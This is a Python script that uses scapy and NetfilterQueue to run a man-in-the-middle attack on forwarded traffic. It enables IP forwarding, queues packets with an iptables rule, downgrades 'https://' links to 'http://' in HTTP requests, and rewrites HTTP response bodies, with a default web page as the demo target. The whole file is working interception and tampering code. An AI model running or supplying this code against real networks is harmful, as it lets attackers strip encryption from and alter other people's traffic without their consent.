from scapy.all import *
import os
from netfilterqueue import NetfilterQueue
import re

def process_packet(packet):
    print("[+] Packet intercepted...")

    # Convert packet to scapy packet
    scapy_packet = IP(packet.get_payload())

    # Check if packet is a HTTP request
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("[+] HTTP Request...")
            load = scapy_packet[Raw].load.decode()
            
            #print("Before modification: ", load)
            load = re.sub('https://', 'http://', load)
            #print("After modification: ", load)

            scapy_packet[Raw].load = load.encode()
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            
            
            packet.set_payload(bytes(scapy_packet))
            # instead of sending the original packet, we send a modified one

    # Check if packet is a HTTP response
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].sport == 80:
            print("[+] HTTP Response...")
            load = scapy_packet[Raw].load.decode()

            #print("Before modification: ", load)
            load = re.sub('<html><body><h1>It works!</h1></body></html>', \
                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
            #print("After modification: ", load)

            scapy_packet[Raw].load = load.encode()
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))

    # Accept packet
    packet.accept()

def start():
    # Enable IP forwarding
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Set up iptables rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Set up packet queue
    queue = NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        print("[+] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping packet interception...")
        queue.unbind()

if __name__ == "__main__":
    start()
